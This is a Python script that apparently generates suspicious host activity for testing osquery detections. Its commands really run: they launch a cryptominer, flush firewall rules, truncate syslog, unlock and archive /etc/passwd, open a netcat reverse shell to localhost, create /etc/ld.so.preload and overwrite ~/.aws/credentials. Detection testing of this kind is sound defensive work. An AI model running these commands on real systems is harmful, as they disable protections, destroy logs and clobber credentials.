import os
import time
import subprocess

def run_suspicious_commands():
    print("[*] Executing suspicious commands...")

    # Fake cryptominer execution
    subprocess.Popen(["/bin/bash", "-c", "nohup ./xmrig &"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Disable firewall
    subprocess.Popen(["/bin/bash", "-c", "iptables -P INPUT ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["/bin/bash", "-c", "iptables -F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Modify security settings
    subprocess.Popen(["/bin/bash", "-c", "chattr -i /etc/passwd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Unusual file operations
    subprocess.Popen(["/bin/bash", "-c", "truncate -s 0 /var/log/syslog"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["/bin/bash", "-c", "tar cf /tmp/evil.tar /etc/passwd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Fake reverse shell attempt
    subprocess.Popen(["/bin/bash", "-c", "nc -e /bin/sh 127.0.0.1 4444"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Fake system process modification
    subprocess.Popen(["/bin/bash", "-c", "touch /etc/ld.so.preload"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[*] Suspicious commands executed!")


def create_suspicious_files():
    print("[*] Creating suspicious files...")

    os.system("echo 'malicious payload' > /tmp/attack.sh")
    os.system("echo 'secret key' > ~/.aws/credentials")
    os.system("echo 'hacked' > /tmp/compromised.log")

    print("[*] Suspicious files created!")


def main():
    print("[*] Simulating suspicious activity for osquery detection...")
    
    create_suspicious_files()
    run_suspicious_commands()

    print("[*] Waiting for the query interval to pass...")
    time.sleep(10)

    print("[*] Simulation completed. Run your osquery query now.")

if __name__ == "__main__":
    main()
